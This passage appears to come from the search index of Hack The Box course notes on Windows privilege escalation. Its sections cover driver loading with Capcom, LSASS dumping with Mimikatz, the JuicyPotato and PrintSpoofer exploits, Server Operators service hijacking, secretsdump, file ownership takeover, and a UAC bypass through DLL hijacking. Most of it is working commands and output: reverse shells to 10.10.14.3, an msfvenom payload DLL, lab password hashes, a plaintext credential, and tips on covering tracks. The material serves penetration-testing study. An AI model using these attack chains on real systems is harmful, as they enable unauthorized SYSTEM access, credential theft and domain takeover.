; STARTUPINFO StartupInfo = { sizeof ( StartupInfo ) }; if ( ! CreateProcess ( CommandLine , CommandLine , nullptr , nullptr , FALSE , CREATE_NEW_CONSOLE , nullptr , nullptr , & StartupInfo , & ProcessInfo )) { return false ; } CloseHandle ( ProcessInfo . hThread ); CloseHandle ( ProcessInfo . hProcess ); return true ; } The CommandLine string in this example would be changed to: TCHAR CommandLine [] = TEXT ( \"C: \\\\ ProgramData \\\\ revshell.exe\" ); We would set up a listener based on the msfvenom payload we generated and hopefully receive a reverse shell connection back when executing ExploitCapcom.exe . If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload. We can use a tool such as EoPLoadDriver to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver: C:\\htb> EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys [+] Enabling SeLoadDriverPrivilege [+] SeLoadDriverPrivilege Enabled [+] Loading Driver: \\Registry\\User\\S-1-5-21-454284637-3659702366-2958135535-1103\\System\\CurrentControlSet\\Capcom NTSTATUS: c000010e, WinError: 0 We would then run ExploitCapcom.exe to pop a SYSTEM shell or run our custom binary. We can cover our tracks a bit by deleting the registry key added earlier. C:\\htb> reg delete HKCU\\System\\CurrentControlSet\\Capcom Permanently delete the registry key HKEY_CURRENT_USER\\System\\CurrentControlSet\\Capcom (Yes/No)? Yes The operation completed successfully. Note: Since Windows 10 Version 1803, the \"SeLoadDriverPrivilege\" is not exploitable, as it is no longer possible to include references to registry keys under \"HKEY_CURRENT_USER\".","title":"Print Operators"},{"location":"windows_privesc/sebugpriv/","text":"To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This would be worth checking in an environment where we obtain credentials for several users and have RDP access to one or more hosts but no additional privileges. After logging on as a user assigned the Debug programs right and opening an elevated shell, we see SeDebugPrivilege is listed. C:\\htb> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======== SeDebugPrivilege Debug programs Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled We can use ProcDump from the SysInternals suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (LSASS) process, which stores user credentials after a user logs on to a system. C:\\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp ProcDump v10.0 - Sysinternals process dump utility Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com [15:25:45] Dump 1 initiated: C:\\Tools\\Procdump\\lsass.dmp [15:25:45] Dump 1 writing: Estimated dump file size is 42 MB. [15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds [15:25:46] Dump count reached. Load this in Mimikatz using the sekurlsa::minidump command. After issuing the sekurlsa::logonPasswords commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations). C:\\htb> mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) # # / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) # # \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # log Using 'mimikatz.log' for logfile : OK mimikatz # sekurlsa::minidump lsass.dmp Switch to MINIDUMP : 'lsass.dmp' mimikatz # sekurlsa::logonpasswords Opening : 'lsass.dmp' file for minidump... Authentication Id : 0 ; 23196355 (00000000:0161f2c3) Session : Interactive from 4 User Name : DWM-4 Domain : Window Manager Logon Server : (null) Logon Time : 3/31/2021 3:00:57 PM SID : S-1-5-90-0-4 msv : tspkg : wdigest : * Username : WINLPE-SRV01$ * Domain : WORKGROUP * Password : (null) kerberos : ssp : credman : <SNIP> Authentication Id : 0 ; 23026942 (00000000:015f5cfe) Session : RemoteInteractive from 2 User Name : jordan Domain : WINLPE-SRV01 Logon Server : WINLPE-SRV01 Logon Time : 3/31/2021 2:59:52 PM SID : S-1-5-21-3769161915-3336846931-3985975925-1000 msv : [00000003] Primary * Username : jordan * Domain : WINLPE-SRV01 * NTLM : cf3a5525ee9414229e66279623ed5c58 * SHA1 : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2 tspkg : wdigest : * Username : jordan * Domain : WINLPE-SRV01 * Password : (null) kerberos : * Username : jordan * Domain : WINLPE-SRV01 * Password : (null) ssp : credman : <SNIP> If unable to load tools on the target but have RDP Access, we can take a manual memory dump of the LSASS process via the Task Manager.","title":"SeDebugPrivilege"},{"location":"windows_privesc/seimpersonate_seassignprimarytoken/","text":"SeImpersonate Example - JuicyPotato Gained a foothold on a SQL server using a privileged SQL user. Client connections to IIS and SQL Server may be configured to use Windows Authentication. The server may then need to access other resources such as file shares as the connecting client. It can be done by impersonating the user whose context the client connection is established. To do so, the service account will be granted the Impersonate a client after authentication privilege. In this scenario, the SQL Service service account is running in the context of the default mssqlserver account. Imagine we have achieved command execution as this user using xp_cmdshell using a set of credentials obtained in a logins.sql file on a file share using the Snaffler tool. Connecting with MSSQLClient.py \u00b6 Using mssqlclient.py from the Impacket toolkit. hrmns@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation Password: [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 1: Changed database context to 'master'. [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (130 19162) [!] Press help for extra shell commands SQL> Enabling xp_cmdshell \u00b6 Next, we must enable the xp_cmdshell stored procedure to run operating system commands. SQL> enable_xp_cmdshell [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install Confirming Access \u00b6 SQL> xp_cmdshell whoami output -------------------------------------------------------------------------------- nt service\\mssql$sqlexpress01 Checking Account Privileges \u00b6 SQL> xp_cmdshell whoami /priv output -------------------------------------------------------------------------------- PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled whoami /priv confirms that SeImpersonatePrivilege is listed. This privilege can be used to impersonate a privileged account such as NT AUTHORITY\\SYSTEM . JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse. Escalating Privileges using JuicyPotato \u00b6 To escalate privileges using these rights, let's first download the JuicyPotato.exe binary and upload this and nc.exe to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. Below, we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively. SQL> xp_cmdshell c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\" -t * output -------------------------------------------------------------------------------- Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375 [+] authresult 0 {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK [+] calling 0x000000000088ce08 Catching Shell \u00b6 hrmns@htb[/htb]$ sudo nc -lnvp 8443 listening on [any] 8443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system C:\\Windows\\system32>hostname hostname WINLPE-SRV01 PrintSpoofer and RoguePotato \u00b6 JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\\SYSTEM level access. Escalating Privileges using PrintSpoofer \u00b6 We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell. SQL> xp_cmdshell c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\" output -------------------------------------------------------------------------------- [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK NULL Catching Shell \u00b6 hrmns@htb[/htb]$ nc -lnvp 8443 listening on [any] 8443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system","title":"SeImpersonate and SeAssignPrimaryToken"},{"location":"windows_privesc/seimpersonate_seassignprimarytoken/#connecting-with-mssqlclientpy","text":"Using mssqlclient.py from the Impacket toolkit. hrmns@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation Password: [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 1: Changed database context to 'master'. [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (130 19162) [!] Press help for extra shell commands SQL>","title":"Connecting with MSSQLClient.py"},{"location":"windows_privesc/seimpersonate_seassignprimarytoken/#enabling-xp_cmdshell","text":"Next, we must enable the xp_cmdshell stored procedure to run operating system commands. SQL> enable_xp_cmdshell [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install","title":"Enabling xp_cmdshell"},{"location":"windows_privesc/seimpersonate_seassignprimarytoken/#confirming-access","text":"SQL> xp_cmdshell whoami output -------------------------------------------------------------------------------- nt service\\mssql$sqlexpress01","title":"Confirming Access"},{"location":"windows_privesc/seimpersonate_seassignprimarytoken/#checking-account-privileges","text":"SQL> xp_cmdshell whoami /priv output -------------------------------------------------------------------------------- PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled whoami /priv confirms that SeImpersonatePrivilege is listed. This privilege can be used to impersonate a privileged account such as NT AUTHORITY\\SYSTEM . JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse.","title":"Checking Account Privileges"},{"location":"windows_privesc/seimpersonate_seassignprimarytoken/#escalating-privileges-using-juicypotato","text":"To escalate privileges using these rights, let's first download the JuicyPotato.exe binary and upload this and nc.exe to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. Below, we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively. SQL> xp_cmdshell c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\" -t * output -------------------------------------------------------------------------------- Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375 [+] authresult 0 {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK [+] calling 0x000000000088ce08","title":"Escalating Privileges using JuicyPotato"},{"location":"windows_privesc/seimpersonate_seassignprimarytoken/#catching-shell","text":"hrmns@htb[/htb]$ sudo nc -lnvp 8443 listening on [any] 8443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system C:\\Windows\\system32>hostname hostname WINLPE-SRV01","title":"Catching Shell"},{"location":"windows_privesc/seimpersonate_seassignprimarytoken/#printspoofer-and-roguepotato","text":"JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\\SYSTEM level access.","title":"PrintSpoofer and RoguePotato"},{"location":"windows_privesc/seimpersonate_seassignprimarytoken/#escalating-privileges-using-printspoofer","text":"We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell. SQL> xp_cmdshell c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\" output -------------------------------------------------------------------------------- [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK NULL","title":"Escalating Privileges using PrintSpoofer"},{"location":"windows_privesc/seimpersonate_seassignprimarytoken/#catching-shell_1","text":"hrmns@htb[/htb]$ nc -lnvp 8443 listening on [any] 8443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system","title":"Catching Shell"},{"location":"windows_privesc/server_operators/","text":"The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers. Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services. Examine the AppReadiness service. We can confirm that this service starts as SYSTEM using the sc.exe utility. C:\\htb> sc qc AppReadiness [SC] QueryServiceConfig SUCCESS SERVICE_NAME: AppReadiness TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\System32\\svchost.exe -k AppReadiness -p LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : App Readiness DEPENDENCIES : SERVICE_START_NAME : LocalSystem We can use the service viewer/controller PsService , which is part of the Sysinternals suite, to check permissions on the service. PsService works much like the sc utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts. C:\\htb> c:\\Tools\\PsService.exe security AppReadiness PsService v2.25 - Service information and configuration utility Copyright (C) 2001-2010 Mark Russinovich Sysinternals - www.sysinternals.com SERVICE_NAME: AppReadiness DISPLAY_NAME: App Readiness ACCOUNT: LocalSystem SECURITY: [ALLOW] NT AUTHORITY\\SYSTEM Query status Query Config Interrogate Enumerate Dependents Pause/Resume Start Stop User-Defined Control Read Permissions [ALLOW] BUILTIN\\Administrators All [ALLOW] NT AUTHORITY\\INTERACTIVE Query status Query Config Interrogate Enumerate Dependents User-Defined Control Read Permissions [ALLOW] NT AUTHORITY\\SERVICE Query status Query Config Interrogate Enumerate Dependents User-Defined Control Read Permissions [ALLOW] BUILTIN\\Server Operators All This confirms that the Server Operators group has SERVICE_ALL_ACCESS access right, which gives us full control over this service. Take a look at the current members of the local administrators group and confirm that our target account is not present. C:\\htb> net localgroup Administrators Alias name Administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator Domain Admins Enterprise Admins The command completed successfully. Change the binary path to execute a command which adds our current user to the default local administrators group. C:\\htb> sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\" [SC] ChangeServiceConfig SUCCESS Starting the service fails, which is expected. C:\\htb> sc start AppReadiness [SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion. If we check the membership of the administrators group, we see that the command was executed successfully. C:\\htb> net localgroup Administrators Alias name Administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator Domain Admins Enterprise Admins server_adm The command completed successfully. From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks. hrmns@htb[/htb]$ crackmapexec smb 10 .129.43.9 -u server_adm -p '**************' SMB 10.129.43.9 445 WINLPE-DC01 [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 10.129.43.9 445 WINLPE-DC01 [+] INLANEFREIGHT.LOCAL\\server_adm:********** (Pwn3d!) Retrieving NTLM Password Hashes from the Domain Controller hrmns@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation Password: [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43 Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a Administrator:des-cbc-md5:d60dfbbf20548938 [*] Cleaning up...","title":"Server Operators"},{"location":"windows_privesc/setakeownershippriv/","text":"SeTakeOwnershipPrivilege grants a user the ability to take ownership of any \"securable object,\" meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor. The setting can be set in Group Policy under: Computer Configuration \u21fe Windows Settings \u21fe Security Settings \u21fe Local Policies \u21fe User Rights Assignment Review current user privileges PS C:\\htb> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ======================================================= ======== SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled The privilege is not enabled. We can enable it using this script . PS C:\\htb> Import-Module .\\Enable-Privilege.ps1 PS C:\\htb> .\\EnableAllTokenPrivs.ps1 PS C:\\htb> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ======================================== ======= SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled Check out target file, to gather more info about it PS C:\\htb> Get-ChildItem -Path 'C:\\Department Shares\\Private\\IT\\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name=\"Owner\";Expression={ (Get-Acl $_.FullName).Owner }} FullName LastWriteTime Attributes Owner -------- ------------- ---------- ----- C:\\Department Shares\\Private\\IT\\cred.txt 6/18/2021 12:23:28 PM Archive Owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. PS C:\\htb> cmd /c dir /q 'C:\\Department Shares\\Private\\IT' Volume in drive C has no label. Volume Serial Number is 0C92-675B Directory of C:\\Department Shares\\Private\\IT 06/18/2021 12:22 PM <DIR> WINLPE-SRV01\\sccm_svc . 06/18/2021 12:22 PM <DIR> WINLPE-SRV01\\sccm_svc .. 06/18/2021 12:23 PM 36 ... cred.txt 1 File(s) 36 bytes 2 Dir(s) 17,079,754,752 bytes free IT share appears to be owned by a service account Use the takedown Windows binary to change the ownership of the file PS C:\\htb> takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt' SUCCESS: The file (or folder): \"C:\\Department Shares\\Private\\IT\\cred.txt\" now owned by user \"WINLPE-SRV01\\htb-student\". Confirm ownership PS C:\\htb> Get-ChildItem -Path 'C:\\Department Shares\\Private\\IT\\cred.txt' | select name,directory, @{Name=\"Owner\";Expression={(Get-ACL $_.Fullname).Owner}} Name Directory Owner ---- --------- ----- cred.txt C:\\Department Shares\\Private\\IT WINLPE-SRV01\\htb-student May still not be able to read the file and need to modify the file ACL using icacls to be able to read it. PS C:\\htb> cat 'C:\\Department Shares\\Private\\IT\\cred.txt' cat : Access to the path 'C:\\Department Shares\\Private\\IT\\cred.txt' is denied. At line:1 char:1 + cat 'C:\\Department Shares\\Private\\IT\\cred.txt' + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\Department Shares\\Private\\IT\\cred.txt:String) [Get-Content], Unaut horizedAccessException + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand Grant our user full privileges over the target file. PS C:\\htb> icacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant htb-student:F processed file: C:\\Department Shares\\Private\\IT\\cred.txt Successfully processed 1 files; Failed processing 0 files Now read the file PS C:\\htb> cat 'C:\\Department Shares\\Private\\IT\\cred.txt' NIX01 admin root:n1X_p0wer_us3er! After performing these changes, make every effort to revert the permissions/file ownership. When to use? Files of Interest: c:\\inetpub\\wwwwroot\\web.config % WINDIR% \\r epair \\s am % WINDIR% \\r epair \\s ystem % WINDIR% \\r epair \\s oftware, %WINDIR% \\r epair \\s ecurity % WINDIR% \\s ystem32 \\c onfig \\S ecEvent.Evt % WINDIR% \\s ystem32 \\c onfig \\d efault.sav % WINDIR% \\s ystem32 \\c onfig \\s ecurity.sav % WINDIR% \\s ystem32 \\c onfig \\s oftware.sav % WINDIR% \\s ystem32 \\c onfig \\s ystem.sav Also .kdbx KeePass db files, OneNote notebooks, files such as password.*, pass.*, cred.*","title":"SeTakeOwnershipPrivilege"},{"location":"windows_privesc/tools/","text":"Tool Description Seatbelt C# project for performing a wide variety of local privilege escalation checks winPEAS WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained here PowerUp PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found SharpUp C# version of PowerUp JAWS PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0 SessionGopher SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information Watson Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. LaZagne Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more Windows Exploit Suggester - Next Generation WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported Sysinternals Suite We will use several tools from Sysinternals in our enumeration including AccessChk , PipeList , and PsService","title":"Useful Tools"},{"location":"windows_privesc/user_account_control/","text":"User Account Control (UAC) is a feature that enables a consent prompt for elevated activities. Applications have different integrity levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. UAC should be enabled, and although it may not stop an attacker from gaining privileges, it is an extra step that may slow this process down and force them to become noisier. Checking Current User C:\\htb> whoami /user USER INFORMATION ---------------- User Name SID ================= ============================================== winlpe-ws03\\sarah S-1-5-21-3159276091-2191180989-3781274054-1002 Confirming Admin Group Membership C:\\htb> net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator mrb3n sarah The command completed successfully. Reviewing User Privileges C:\\htb> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled Confirming UAC is Enabled C:\\htb> REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System EnableLUA REG_DWORD 0x1 Checking UAC Level C:\\htb> REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System ConsentPromptBehaviorAdmin REG_DWORD 0x5 The value of ConsentPromptBehaviorAdmin is 0x5 , which means the highest UAC level of Always notify is enabled. There are fewer UAC bypasses at this highest level. Checking Windows Version PS C:\\htb> [environment]::OSVersion.Version Major Minor Build Revision ----- ----- ----- -------- 10 0 14393 0 Build version 14393, which using this page we cross-reference to Windows release 1607 . The UACME project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary SystemPropertiesAdvanced.exe . There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt. The 32-bit version of SystemPropertiesAdvanced.exe attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality. When attempting to locate a DLL, Windows will use the following search order: The directory from which the application loaded. The system directory C:\\Windows\\System32 for 64-bit systems. The 16-bit system directory C:\\Windows\\System (not supported on 64-bit systems) The Windows directory. Any directories that are listed in the PATH environment variable. Reviewing Path Variable. The WindowsApps folder is within the user's profile and writable by the user. PS C:\\htb> cmd /c echo %PATH% C:\\Windows\\system32; C:\\Windows; C:\\Windows\\System32\\Wbem; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\; C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps; We can potentially bypass UAC in this by using DLL hijacking by placing a malicious srrstr.dll DLL to WindowsApps folder, which will be loaded in an elevated context. Generating Malicious srrstr.dll DLL hrmns@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST = 10 .10.14.3 LPORT = 8443 -f dll > srrstr.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of dll file: 5120 bytes hrmns@htb[/htb]$ sudo python3 -m http.server 8080 Downloading DLL Target hrmns@htb[/htb]$ curl http://10.10.14.3:8080/srrstr.dll -O \"C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\" Starting nc Listener on Attack Host hrmns@htb[/htb]$ nc -lvnp 8443 If we execute the malicious srrstr.dll file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using rundll32.exe to get a reverse shell connection. C:\\htb> rundll32 shell32.dll,Control_RunDLL C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll Once we get a connection back, we'll see normal user rights. hrmns@htb[/htb]$ nc -lnvp 8443 listening on [any] 8443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Users\\sarah> whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled Now, we can execute the 32-bit version of SystemPropertiesAdvanced.exe from the target host. C:\\htb> C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe Checking back on our listener, we should receive a connection almost instantly. hrmns@htb[/htb]$ nc -lvnp 8443 listening on [any] 8443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami winlpe-ws03\\sarah C:\\Windows\\system32>whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======== SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeSecurityPrivilege Manage auditing and security log Disabled SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeSystemProfilePrivilege Profile system performance Disabled SeSystemtimePrivilege Change the system time Disabled SeProfileSingleProcessPrivilege Profile single process Disabled 